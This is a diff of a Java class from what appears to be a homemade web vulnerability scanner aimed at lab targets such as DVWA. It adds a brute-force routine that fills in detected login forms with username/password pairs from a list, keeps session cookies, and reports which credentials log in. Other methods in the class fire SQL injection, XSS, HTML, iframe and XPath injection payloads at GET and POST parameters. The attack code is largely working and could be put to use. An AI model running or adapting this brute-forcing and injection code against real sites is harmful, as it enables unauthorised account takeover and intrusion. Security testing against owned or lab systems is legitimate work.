@@ -26,27 +26,27 @@ import org.jsoup.select.Elements;
  * @author Shaco JX
  */
 public class Scan {
+
     private static HashSet<String> hashSet = new HashSet<>();
 
-    public void Scan(String url) throws IOException {   
+    public void Scan(String url) throws IOException {
         System.out.println("[ Checking Vuln Top 10 OWASP ]");
         System.out.println("Please waiting... Checking ...");
-        
-        WebCrawlerWithDepth wc = new WebCrawlerWithDepth();
-        System.out.println("Spider level: " + wc.MAX_DEPTH);
-        wc.getPageLinks(url, 0, url);
-        System.out.println("Total link: " + wc.links.size());
 
-        for (String s : wc.links) {
-            System.out.println(s);
-        }
+//        WebCrawlerWithDepth wc = new WebCrawlerWithDepth();
+//        System.out.println("Spider level: " + wc.MAX_DEPTH);
+//        wc.getPageLinks(url, 0, url);
+//        System.out.println("Total link: " + wc.links.size());
+//
+//        for (String s : wc.links) {
+//            System.out.println(s);
+//        }
+//
+//        System.out.println("---------------------------------------------------------------------------------");
+//
+//        this.scanVuln(wc.links);
+        this.bruteForce(url);
 
-        System.out.println("---------------------------------------------------------------------------------");
-
-        this.scanVuln(wc.links);
-
-//        this.tancong("http://testphp.vulnweb.com/login.php");
-        
         System.out.println("Scan End!");
     }
 
@@ -89,8 +89,6 @@ public class Scan {
 //        }
 //
 //    }
-    
-
     public void attackGetPost(Element element, String urlAction, Map<String, ArrayList> paySig, String vulnName) throws IOException {
 //        System.out.println("2222222222222222222222222222222222222");
 //        System.out.println(urlAction);
@@ -142,7 +140,7 @@ public class Scan {
         }
     }
 
-    public void attackGet(String urlAction,  Map<String, ArrayList> paySig, String vulnName) throws IOException {
+    public void attackGet(String urlAction, Map<String, ArrayList> paySig, String vulnName) throws IOException {
 //        System.out.println("3333333333333333333333333333333333");
 //        System.out.println(urlAction);
         String fURL = urlAction.split("\\?")[0];
@@ -151,7 +149,7 @@ public class Scan {
 //        System.out.println(lURL);
         Map<String, String> mapParemeter;
         boolean checkVuln = false;
-        
+
         for (Map.Entry<String, ArrayList> entry : paySig.entrySet()) {
             String keyPay = entry.getKey();
             ArrayList<String> valueSig = entry.getValue();
@@ -177,8 +175,8 @@ public class Scan {
                     if (doc.body().toString().contains(sSig)) {
                         checkVuln = true;
                         System.out.println("GET " + vulnName + " : " + urlAction);
-                        System.out.println("Pay = "+ keyPay);
-                        System.out.println("Sig = "+ sSig);
+                        System.out.println("Pay = " + keyPay);
+                        System.out.println("Sig = " + sSig);
                         break;
                     }
                 }
@@ -190,128 +188,139 @@ public class Scan {
             }
         }
     }
-    
+
     public void scanVuln(HashSet<String> listURL) throws IOException {
         for (String sURL : listURL) {
             this.scanVuln(sURL);
         }
     }
-    
-    public void scanVuln(String sURL) throws IOException{        
-            if (!sURL.contains("jpg")) {
-                if (sURL.contains("?")) {
-                    String temp = sURL.split("\\?")[0];
-                    if (!hashSet.contains(temp)) {
-                        hashSet.add(temp);
-                        this.scanMethodGet(sURL);
-                    }
-                } else {
-                    try {
-                        Document document = Jsoup.connect(sURL).userAgent("Mozilla").followRedirects(false).get();
-                        Elements linksOnPage = document.select("form");
-                        for (Element element : linksOnPage) {
-                            String temp = "";
-                            try {
-                                temp = element.attr("abs:action");
-                            } catch (Exception e) {
-                            }
-                            if (temp.length() != 0) {
-                                if (!hashSet.contains(temp)) {
-                                    hashSet.add(temp);
+
+    public void scanVuln(String sURL) throws IOException {
+        if (!sURL.contains("jpg")) {
+            if (sURL.contains("?")) {
+                String temp = sURL.split("\\?")[0];
+                if (!hashSet.contains(temp)) {
+                    hashSet.add(temp);
+                    this.scanMethodGet(sURL);
+                }
+            } else {
+                try {
+                    Document document = Jsoup.connect(sURL).userAgent("Mozilla").followRedirects(false).get();
+                    Elements linksOnPage = document.select("form");
+                    for (Element element : linksOnPage) {
+                        String temp = "";
+                        try {
+                            temp = element.attr("abs:action");
+                        } catch (Exception e) {
+                        }
+                        if (temp.length() != 0) {
+                            if (!hashSet.contains(temp)) {
+                                hashSet.add(temp);
 //                                    System.out.println("Hashset : " + temp);
-                                    if (temp.contains("?")) {
-                                        this.scanMethodGet(temp);
-                                    }
-                                    this.scanMethodGetPost(element, temp);
+                                if (temp.contains("?")) {
+                                    this.scanMethodGet(temp);
                                 }
-                            } else {
-                                this.scanMethodGetPost(element, sURL);
-                            }                            
-                        }
-                    } catch (Exception e) {
-                        System.out.println("Error scanVuln: " + sURL + " ||| " + e);
-                    }
-                }
-            }
-        
-    }
-    
-    public void tancong(String sURL) throws IOException{
-        sURL = "http://192.168.1.17:8080/dvwa/login.php";
-        Document document = Jsoup.connect(sURL).userAgent("Mozilla").get();
-        Elements linksOnPage = document.select("form");
-        Element ele = null;
-        String name = "";
-        String action = "";
-        for (Element element : linksOnPage) {            
-            try {
-                action = element.attr("abs:action");
-                name = element.attr("abs:name");
-            } catch (Exception e) {
-            }
-            
-            if(name.contains("login") || action.contains("login") || name.contains("dangnhap") || action.contains("dangnhap")){
-                ele = element;
-                break;
-            }            
-        }
-        
-        
-        Map<String, String> map = new HashMap<String, String>();
-        Elements eles = ele.getElementsByAttribute("name");
-//        System.out.println(eles);
-//        System.out.println("xxxxxxxxxxx");
-
-        for (Element ele1 : eles) {
-            String xname = ele1.attr("name");
-            String xvalue = ele1.attr("value");
-            String xtype = ele1.attr("type");
-            if (xname.length() != 0) {
-                if (xvalue.contains("submit") || xvalue.contains("button")) {
-                    map.put(xname, xvalue);
-                    System.out.println("1" + xname);
-                } else {
-                    if (xvalue.length() != 0) {
-                        map.put(xname, xvalue);
-                        System.out.println("2" + xname);
-                    } else {
-                        if (xtype.contains("password")) {
-                            map.put(xname, "password");
-                            System.out.println("3" + xname);
+                                this.scanMethodGetPost(element, temp);
+                            }
                         } else {
-                            
-                            map.put(xname, "admin");
-                            System.out.println("4" + xname);
+                            this.scanMethodGetPost(element, sURL);
+                        }
+                    }
+                } catch (Exception e) {
+                    System.out.println("Error scanVuln: " + sURL + " ||| " + e);
+                }
+            }
+        }
+
+    }
+
+    public void bruteForce(String sURL) throws IOException {
+        P_S ps = new P_S();
+//        Document document = Jsoup.connect(sURL).userAgent("Mozilla").get();
+
+        for (Map.Entry<String, String> entry : ps.userPass().entrySet()) {
+            String keyUser = entry.getKey();
+            String valuePass = entry.getValue();
+
+            Response resp = Jsoup.connect(sURL).userAgent("Mozilla").method(Connection.Method.GET).execute();
+            Document doc = resp.parse();
+            Map<String, String> cookie = new HashMap<>();
+            cookie = resp.cookies();
+
+            Elements linksOnPage = doc.select("form");
+            Element ele = null;
+            String name = "";
+            String action = "";
+            for (Element element : linksOnPage) {
+                try {
+                    action = element.attr("abs:action");
+                    name = element.attr("abs:name");
+                } catch (Exception e) {
+                }
+
+                if (name.contains("login") || action.contains("login") || name.contains("dangnhap") || action.contains("dangnhap")) {
+                    ele = element;
+                    break;
+                }
+            }
+
+            Map<String, String> map = new HashMap<String, String>();
+            Elements eles = ele.getElementsByAttribute("name");
+
+            for (Element ele1 : eles) {
+                String xname = ele1.attr("name");
+                String xvalue = ele1.attr("value");
+                String xtype = ele1.attr("type");
+                if (xname.length() != 0) {
+                    if (xtype.contains("submit") || xtype.contains("button")) {
+                        map.put(xname, this.encodeValue(xvalue));
+//                        System.out.println("1" + xname);
+                    } else {
+                        if (xvalue.length() != 0) {
+                            map.put(xname, this.encodeValue(xvalue));
+//                            System.out.println("2" + xname);
+                        } else {
+                            if (xtype.contains("password")) {
+                                map.put(xname, this.encodeValue(valuePass));
+//                                System.out.println("3" + xname);
+                            } else {
+                                map.put(xname, this.encodeValue(keyUser));
+//                                System.out.println("4" + xname);
+                            }
                         }
                     }
                 }
+            }
+//            System.out.println(map);
 
+            resp = Jsoup.connect(sURL).cookies(cookie).data(map).method(Connection.Method.POST).execute();
+//            System.out.println(resp.url());
+
+            Document document = resp.parse();
+            Elements formCheck = document.select("form");
+            boolean checkLogin1 = true;
+            boolean checkLogin2 = true;
+            
+            for (Element e : formCheck) {
+                if(e.attr("abs:action").equals(action)){
+                    checkLogin1 = false;
+                    break;
+                }
+            }
+            formCheck = document.getElementsByAttribute("href");
+            for (Element e : formCheck) {
+                if(e.attr("abs:href").equals(action)){
+                    checkLogin2 = false;
+                    break;
+                }
+            }                       
+            if (checkLogin1 && checkLogin2) {
+                System.out.println("Login Thanh Cong : "+ sURL);
+                System.out.println("User: "+keyUser+" ---- Password: "+valuePass);
             }
         }
-//                map.put("btn_submit", encodeValue("ĐĂNG NHẬP"));
-        System.out.println(map);
-
-    
-        
-        Response doc = Jsoup.connect(action).data(map).userAgent("Mozilla").method(Connection.Method.POST).execute();
-//        document = Jsoup.connect(action).data(map).userAgent("Mozilla").post();
-        System.out.println(doc.url());
-        
-        Map<String, String> testCooki = doc.cookies();
-        System.out.println("Cooki: "+testCooki);
-        
-        Map<String, String> testmap = new HashMap<String, String>();
-        testmap.put("security","impossible");
-        testmap.put("PHPSESSID","6389m9beodnve9896cie3v9g01");
-        Response doc1 = Jsoup.connect("http://192.168.1.17:8080/dvwa/index.php").cookies(testmap).userAgent("Mozilla").method(Connection.Method.GET).execute();
-        System.out.println(doc1.url());
-        System.out.println("Cooki2222: " + doc1.headers());
-//        Document doc1 = Jsoup.connect("http://192.168.1.17:8080/dvwa/index.php").cookies(doc.cookies()).userAgent("Mozilla").get();    
-//        System.out.println(doc.body());
-
-
     }
-    
+
     // Method to encode a string value using `UTF-8` encoding scheme
     public String encodeValue(String value) {
         try {
@@ -323,14 +332,14 @@ public class Scan {
 
     public void scanMethodGet(String urlAction) throws IOException {
         P_S ps = new P_S();
-        
+
         this.attackGet(urlAction, ps.HTMLinjection(), "HTML injection");
         this.attackGet(urlAction, ps.IFrameInjection(), "IFrame injection");
         this.attackGet(urlAction, ps.SQLinjection(), "SQL injection");
         this.attackGet(urlAction, ps.XSS(), "XSS");
-        this.attackGet(urlAction, ps.XMLXPathInjection(), "XML/XPath injection");        
-}
-    
+        this.attackGet(urlAction, ps.XMLXPathInjection(), "XML/XPath injection");
+    }
+
     public void scanMethodGetPost(Element element, String urlAction) throws IOException {
         P_S ps = new P_S();
 
@@ -338,7 +347,7 @@ public class Scan {
         this.attackGetPost(element, urlAction, ps.IFrameInjection(), "IFrame injection");
         this.attackGetPost(element, urlAction, ps.SQLinjection(), "SQL injection");
         this.attackGetPost(element, urlAction, ps.XSS(), "XSS");
-        this.attackGetPost(element, urlAction, ps.XMLXPathInjection(), "XML/XPath injection");        
+        this.attackGetPost(element, urlAction, ps.XMLXPathInjection(), "XML/XPath injection");
     }
 
 }
